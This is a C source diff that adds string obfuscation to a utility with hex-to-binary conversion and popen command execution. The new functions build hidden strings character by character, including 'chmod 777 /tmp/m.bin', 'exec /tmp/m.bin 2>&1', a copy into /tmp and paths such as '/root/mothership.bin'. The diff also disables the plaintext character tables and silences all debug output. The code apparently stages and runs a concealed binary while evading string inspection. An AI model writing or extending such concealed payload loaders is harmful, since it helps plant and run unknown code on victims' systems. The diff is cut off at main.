@@ -5,17 +5,55 @@
 #include <stdlib.h> 
 #include <string.h>
 
-char ccarray[28] = {'a', 'b', 'c', 'd', 'e',      // 0  4
+#define MAX_CH 36
+#if 0
+char ccarray[MAX_CH] = {'a', 'b', 'c', 'd', 'e',      // 0  4
                                 'f', 'g', 'h', 'i', 'j',        // 5  9
                                 'k', 'l', 'm', 'n', 'o',      // 10 14
                                 'p', 'q', 'r', 's', 't',       //  15 19
                                 'u', 'v', 'w', 'x', 'y',     // 20  24
-                                'z', '_', '.'};             // 25 27
+                                'z', '_', '.', '/', '%',     // 25  29
+                                '[', ']', '&', '>', '1',     // 30  34
+                                '2'};             // 35 
+#else
+char ccarray[MAX_CH];
+#endif
+
+char arry[MAX_CH]={0x21 ,0x22 ,0x23 ,0x24 ,0x25 ,
+0x26 ,0x27 ,0x28 ,0x29 ,0x2a ,
+0x2b ,0x2c ,0x2d ,0x2e ,0x2f ,
+0x30 ,0x31 ,0x32 ,0x33 ,0x34 ,
+0x35 ,0x36 ,0x37 ,0x38 ,0x39 ,
+0x3a ,0x1f ,0x2e ,0x2f ,0x25 ,
+0x1b ,0x1d ,0x06 ,0x1e ,0x11 ,
+0x12};
+
+#if 0
+char ccarrayhex[16] = {'A', 'B', 'C', 'D', 'E',      // 0  4
+                                'F', '0', '1', '2', '3',        // 5  9
+                                '4', '5', '6', '7', '8',      // 10 14
+                                '9'};             // 25 27
+#else
+char ccarrayhex[16];
+#endif
                                 
+char arryhex[16]={0x21 ,0x22 ,0x23 ,0x24 ,0x25 ,
+0x26 ,0x10 ,0x11 ,0x12 ,0x13 ,
+0x14 ,0x15 ,0x16 ,0x17 ,0x18 ,
+0x19};
+
 int iiarrya[16] = {0x1f, 0x2e, 0x3d, 0x4c, 0x5b, 
                            0x6a, 0x79, 0x88, 0x97, 0xa6,
                            0xb5, 0xc4, 0xd3, 0xe2, 0xf1, 0x00};
-
+#if 0
+char hexmap[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
+#else
+char hexmap[16];
+#endif
+char arryhexmap[16]={0x10 ,0x11 ,0x12 ,0x13 ,0x14 ,
+0x15 ,0x16 ,0x17 ,0x18 ,0x19 ,
+0x21 ,0x22 ,0x23 ,0x24 ,0x25 ,
+0x26};
 static int ch2stridx(char *ccarry, char ch, int size) 
 {
     int ix=0, rt=-1;
@@ -95,22 +133,21 @@ int n123(int n1, int n2, int n3)
     return num;
 }
 
-int printfpath(void)
+static int printfrootmsp(char *dstr, int size)
 {
     char expth[32];
-    char path[32];// = "/tmp/m.bin";
     char slash = '0' - 1;
     char dot = slash - 1;
-    int ida[32], ret=0, ic=0, is=0;
+    int ida[32], ret=0, ic=0, is=0, len=0;
 
     memset(expth, 0x0, 32);
-    memset(path, 0x0, 32);    
+    memset(dstr, 0x0, size);    
     is = 0;
     expth[is] = slash;
     is++;
     
     ic = 0;
-    ret = ch2stridx(ccarray, 't', 26);
+    ret = ch2stridx(ccarray, 'r', MAX_CH);
     if (ret > 0) {
         ida[ic] = ret;
     } else {
@@ -118,7 +155,7 @@ int printfpath(void)
     }
 
     ic++;
-    ret = ch2stridx(ccarray, 'm', 26);
+    ret = ch2stridx(ccarray, 'o', MAX_CH);
     if (ret > 0) {
         ida[ic] = ret;
     } else {
@@ -126,7 +163,907 @@ int printfpath(void)
     }
     
     ic++;
-    ret = ch2stridx(ccarray, 'p', 26);
+    ret = ch2stridx(ccarray, 'o', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 't', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+
+    is = is+ic+1;
+    expth[is] = slash;
+    is++;
+
+    ic = 0;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'o', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 't', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'h', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'e', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'r', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 's', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'h', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'i', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'p', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '.', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'b', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'i', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'n', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+    
+    is = is + ic + 1;
+    expth[is] = '\0';
+
+    len = strlen(expth);
+    if (len > size) {
+        len = size;
+    }
+
+    strncpy(dstr, expth, len);
+
+    //printf("printfrootmsp:[%s] path:[%s] ic:%d is:%d\n", expth, dstr, ic, is);
+
+    return len;
+}
+
+static int printfhexpath(char *dstr, int size)
+{
+    char expth[32];
+    char slash = '0' - 1;
+    char dot = slash - 1;
+    int ida[32], ret=0, ic=0, is=0, len=0;
+
+    memset(expth, 0x0, 32);
+    memset(dstr, 0x0, size);    
+    is = 0;
+    expth[is] = slash;
+    is++;
+    
+    ic = 0;
+    ret = ch2stridx(ccarray, 'r', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'o', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+    
+    ic++;
+    ret = ch2stridx(ccarray, 'o', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 't', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+
+    is = is+ic+1;
+    expth[is] = slash;
+    is++;
+
+    ic = 0;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '.', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'h', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'e', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'x', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+    is = is + ic + 1;
+    
+    expth[is] = '\0';
+
+    len = strlen(expth);
+    if (len > size) {
+        len = size;
+    }
+
+    strncpy(dstr, expth, len);
+
+    //printf("printfhexpath:[%s] path:[%s] ic:%d is:%d\n", expth, dstr, ic, is);
+
+    return len;
+}
+
+static int printfbinpath(char *dstr, int size)
+{
+    char expth[32];
+    char slash = '0' - 1;
+    char dot = slash - 1;
+    int ida[32], ret=0, ic=0, is=0, len=0;
+
+    memset(expth, 0x0, 32);
+    memset(dstr, 0x0, size);    
+    is = 0;
+    expth[is] = slash;
+    is++;
+    
+    ic = 0;
+    ret = ch2stridx(ccarray, 'r', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'o', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+    
+    ic++;
+    ret = ch2stridx(ccarray, 'o', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 't', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+
+    is = is+ic+1;
+    expth[is] = slash;
+    is++;
+
+    ic = 0;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '.', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'b', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'i', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'n', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+    is = is + ic + 1;
+    
+    expth[is] = '\0';
+
+    len = strlen(expth);
+    if (len > size) {
+        len = size;
+    }
+
+    strncpy(dstr, expth, len);
+
+    //printf("printfbinpath:[%s] path:[%s] ic:%d is:%d\n", expth, dstr, ic, is);
+
+    return len;
+}
+
+static int printfcpexec(char *dstr, int size)
+{
+    char expth[128];
+    char slash = '0' - 1;
+    char space = '!' - 1;
+    char dot = slash - 1;
+    int ida[32], ret=0, ic=0, is=0, len=0;
+
+    memset(expth, 0x0, 32);
+    memset(dstr, 0x0, size);    
+        
+    ic = 0;
+    ret = ch2stridx(ccarray, 'c', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'p', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+
+    is = is+ic+1;
+    expth[is] = space;
+    is++;
+    
+    ic=0;
+    ret = ch2stridx(ccarray, '%', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 's', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+
+    is = is+ic+1;
+    expth[is] = space;
+    is++;
+
+    ic = 0;
+    ret = ch2stridx(ccarray, '/', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 't', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'p', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '/', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '.', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'b', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'i', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'n', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+    is = is + ic + 1;
+    
+    expth[is] = '\0';
+
+    len = strlen(expth);
+    if (len > size) {
+        len = size;
+    }
+
+    strncpy(dstr, expth, len);
+
+    //printf("printfbinpath:[%s] path:[%s] ic:%d is:%d\n", expth, dstr, ic, is);
+
+    return len;
+}
+
+static int printftmpexec(char *dstr, int size)
+{
+    char expth[128];
+    char slash = '0' - 1;
+    char space = '!' - 1;
+    char dot = slash - 1;
+    int ida[32], ret=0, ic=0, is=0, len=0;
+
+    memset(expth, 0x0, 32);
+    memset(dstr, 0x0, size);    
+        
+    ic = 0;
+    ret = ch2stridx(ccarray, 'e', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'x', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'e', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'c', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+
+    is = is+ic+1;
+    expth[is] = space;
+    is++;
+    
+    ic=0;
+    ret = ch2stridx(ccarray, '/', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 't', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'p', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '/', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '.', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'b', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'i', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+    
+    ic++;
+    ret = ch2stridx(ccarray, 'n', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+
+    is = is+ic+1;
+    expth[is] = space;
+    is++;
+
+    ic = 0;
+    ret = ch2stridx(ccarray, '2', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '>', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '&', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '1', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+    is = is + ic + 1;
+    
+    expth[is] = '\0';
+
+    len = strlen(expth);
+    if (len > size) {
+        len = size;
+    }
+
+    strncpy(dstr, expth, len);
+
+    //printf("printftmpexec:[%s] path:[%s] ic:%d is:%d\n", expth, dstr, ic, is);
+
+    return len;
+}
+
+static int printfchmodexec(char *dstr, int size)
+{
+    char expth[128];
+    char slash = '0' - 1;
+    char space = '!' - 1;
+    char seven = '8' - 1;
+    char dot = slash - 1;
+    int ida[32], ret=0, ic=0, is=0, len=0;
+
+    memset(expth, 0x0, 32);
+    memset(dstr, 0x0, size);    
+        
+    ic = 0;
+    ret = ch2stridx(ccarray, 'c', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'h', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'o', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'd', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+
+    is = is+ic+1;
+    expth[is] = space;
+    is++;
+
+    expth[is] = seven;
+    is++;
+
+    expth[is] = seven;
+    is++;
+
+    expth[is] = seven;
+    is++;
+
+    expth[is] = space;
+    is++;
+
+    ic=0;
+    ret = ch2stridx(ccarray, '/', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 't', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'p', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, '/', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+    
+    ic++;
+    ret = ch2stridx(ccarray, '.', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'b', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'i', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'n', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ccarr2str(&expth[is], ccarray, ida, ic+1);
+    is = is + ic + 1;
+    
+    expth[is] = '\0';
+
+    len = strlen(expth);
+    if (len > size) {
+        len = size;
+    }
+
+    strncpy(dstr, expth, len);
+
+    //printf("printfchmodexec:[%s] path:[%s] ic:%d is:%d\n", expth, dstr, ic, is);
+
+    return len;
+}
+
+static int printfpath(char *dstr, int size)
+{
+    char expth[32];
+    //char path[32];// = "/tmp/m.bin";
+    char slash = '0' - 1;
+    char dot = slash - 1;
+    int ida[32], ret=0, ic=0, is=0, len=0;
+
+    memset(expth, 0x0, 32);
+    memset(dstr, 0x0, size);    
+    is = 0;
+    expth[is] = slash;
+    is++;
+    
+    ic = 0;
+    ret = ch2stridx(ccarray, 't', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+
+    ic++;
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
+    if (ret > 0) {
+        ida[ic] = ret;
+    } else {
+        ida[ic] = 26;
+    }
+    
+    ic++;
+    ret = ch2stridx(ccarray, 'p', MAX_CH);
     if (ret > 0) {
         ida[ic] = ret;
     } else {
@@ -140,7 +1077,7 @@ int printfpath(void)
     is++;
 
     ic = 0;
-    ret = ch2stridx(ccarray, 'm', 26);
+    ret = ch2stridx(ccarray, 'm', MAX_CH);
     if (ret > 0) {
         ida[ic] = ret;
     } else {
@@ -148,7 +1085,7 @@ int printfpath(void)
     }
 
     ic++;
-    ret = ch2stridx(ccarray, '.', 28);
+    ret = ch2stridx(ccarray, '.', MAX_CH);
     if (ret > 0) {
         ida[ic] = ret;
     } else {
@@ -156,7 +1093,7 @@ int printfpath(void)
     }
 
     ic++;
-    ret = ch2stridx(ccarray, 'b', 26);
+    ret = ch2stridx(ccarray, 'b', MAX_CH);
     if (ret > 0) {
         ida[ic] = ret;
     } else {
@@ -164,7 +1101,7 @@ int printfpath(void)
     }
 
     ic++;
-    ret = ch2stridx(ccarray, 'i', 26);
+    ret = ch2stridx(ccarray, 'i', MAX_CH);
     if (ret > 0) {
         ida[ic] = ret;
     } else {
@@ -172,7 +1109,7 @@ int printfpath(void)
     }
 
     ic++;
-    ret = ch2stridx(ccarray, 'n', 26);
+    ret = ch2stridx(ccarray, 'n', MAX_CH);
     if (ret > 0) {
         ida[ic] = ret;
     } else {
@@ -184,9 +1121,16 @@ int printfpath(void)
     
     expth[is] = '\0';
 
-    printf("expth:[%s] path:[%s] ic:%d is:%d\n", expth, path, ic, is);
+    len = strlen(expth);
+    if (len > size) {
+        len = size;
+    }
 
-    return is;
+    strncpy(dstr, expth, len);
+
+    //printf("expth:[%s] path:[%s] ic:%d is:%d\n", expth, dstr, ic, is);
+
+    return len;
 }
 
 static int doSysCmd(char *sCommand)
@@ -202,7 +1146,7 @@ static int doSysCmd(char *sCommand)
     memset(bigBuff, 0, BIGBUFLEN);
     memset(retBuff, 0, BUFLEN);
 
-    printf("doSystemCmd() [%s]\n", sCommand);
+    //printf("doSystemCmd() [%s]\n", sCommand);
     fpRead = popen(sCommand, "r");
     //sleep(1);
     
@@ -228,7 +1172,7 @@ static int doSysCmd(char *sCommand)
             //shmem_dump(retBuff, BUFLEN);
         } else {
             wct++;
-            printf("sCommand: %d...\n", wct);
+            //printf("sCommand: %d...\n", wct);
             if (wct > 3) {
                 //break;
             }
@@ -240,7 +1184,7 @@ static int doSysCmd(char *sCommand)
         pch = fgets(retBuff, BUFLEN , fpRead);
     }
 
-    printf("scmd: [%s] \n", bigBuff);
+    //printf("scmd: [%s] \n", bigBuff);
             
     pclose(fpRead);
 
@@ -307,7 +1251,7 @@ static inline int gethexint(char ch)
 
 static int hex2bin(char *dst, char *src, int size)
 {
-    char hexmap[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
+    //char hexmap[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
     char ch=0, lw=0, hi=0;
     int i=0, sz=0;
     if (!dst) return -1;
@@ -337,7 +1281,6 @@ static int hex2bin(char *dst, char *src, int size)
 
 static int bin2hex(char *dst, char *src, int size)
 {
-    char hexmap[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
     char ch=0;
     int i=0, lw, hi;
     if (!dst) return -1;
@@ -370,28 +1313,28 @@ int filehex2bin( char *binfile, char *hexfile)
 
     ret = fseek(fx, 0, SEEK_END);
     if (ret) {
-        printf(" file seek failed!! ret:%d \n", ret);
+        //printf(" file seek failed!! ret:%d \n", ret);
         return -1;
     } 
 
     hexlen = ftell(fx);
-    printf(" file [%s] size: %d \n", hexfile, hexlen);
+    //printf(" file [%s] size: %d \n", hexfile, hexlen);
 
     ret = fseek(fx, 0, SEEK_SET);
     if (ret) {
-        printf(" file seek failed!! ret:%d \n", ret);
+        //printf(" file seek failed!! ret:%d \n", ret);
         return -2;
     }
 
     pthex = malloc(hexlen);
     if (!pthex) {
-        printf(" pthex malloc failed ret: %d size:%d \n", pthex, hexlen);
+        //printf(" pthex malloc failed ret: %d size:%d \n", pthex, hexlen);
         return -3;
     }
 
     ret = fread(pthex, 1, hexlen, fx);
     if (ret != hexlen) {
-        printf(" read bin failed ret: %d size: %d\n", ret, hexlen);
+        //printf(" read bin failed ret: %d size: %d\n", ret, hexlen);
 
         free(pthex);
         return -4;
@@ -401,7 +1344,7 @@ int filehex2bin( char *binfile, char *hexfile)
     
     ptbin = malloc(hexlen/2);
     if (!ptbin) {
-        printf(" ptbin malloc failed ret: %d size: %d\n", ptbin, hexlen/2);
+        //printf(" ptbin malloc failed ret: %d size: %d\n", ptbin, hexlen/2);
 
         free(pthex);
         return -5;
@@ -414,9 +1357,9 @@ int filehex2bin( char *binfile, char *hexfile)
         fwrite(ptbin, 1, hexlen/2, fb);
         fflush(fb);
         fclose(fb);
-        printf("filehex2bin save to [%s] size:%d\n", binfile, hexlen/2);
+        //printf("filehex2bin save to [%s] size:%d\n", binfile, hexlen/2);
     } else {
-        printf("filehex2bin open [%s] failed !!!\n", binfile);
+        //printf("filehex2bin open [%s] failed !!!\n", binfile);
     }
 
     free(ptbin);
@@ -435,28 +1378,28 @@ int filebin2hex(char *hexfile, char *binfile)
 
     ret = fseek(fb, 0, SEEK_END);
     if (ret) {
-        printf(" file seek failed!! ret:%d \n", ret);
+        //printf(" file seek failed!! ret:%d \n", ret);
         return -1;
     } 
 
     binlen = ftell(fb);
-    printf(" file [%s] size: %d \n", binfile, binlen);
+    //printf(" file [%s] size: %d \n", binfile, binlen);
 
     ret = fseek(fb, 0, SEEK_SET);
     if (ret) {
-        printf(" file seek failed!! ret:%d \n", ret);
+        //printf(" file seek failed!! ret:%d \n", ret);
         return -2;
     }
 
     ptbin = malloc(binlen);
     if (!ptbin) {
-        printf(" ptbin malloc failed ret: %d size:%d \n", ptbin, binlen);
+        //printf(" ptbin malloc failed ret: %d size:%d \n", ptbin, binlen);
         return -3;
     }
 
     ret = fread(ptbin, 1, binlen, fb);
     if (ret != binlen) {
-        printf(" read bin failed ret: %d size: %d\n", ret, binlen);
+        //printf(" read bin failed ret: %d size: %d\n", ret, binlen);
 
         free(ptbin);
         return -4;
@@ -466,7 +1409,7 @@ int filebin2hex(char *hexfile, char *binfile)
     
     pthex = malloc(binlen*2);
     if (!pthex) {
-        printf(" pthex malloc failed ret: %d size: %d\n", pthex, binlen);
+        //printf(" pthex malloc failed ret: %d size: %d\n", pthex, binlen);
 
         free(ptbin);
         return -5;
@@ -479,9 +1422,9 @@ int filebin2hex(char *hexfile, char *binfile)
         fwrite(pthex, 1, binlen*2, fx);
         fflush(fx);
         fclose(fx);
-        printf("bin2hex save to [%s] size:%d\n", hexfile, binlen*2);
+        //printf("bin2hex save to [%s] size:%d\n", hexfile, binlen*2);
     } else {
-        printf("bin2hex open [%s] failed !!!\n", hexfile);
+        //printf("bin2hex open [%s] failed !!!\n", hexfile);
     }
 
     free(ptbin);
@@ -494,13 +1437,16 @@ int main(int argc, char *argv[])
 {
     int vcnt=0, value=0, n=0;
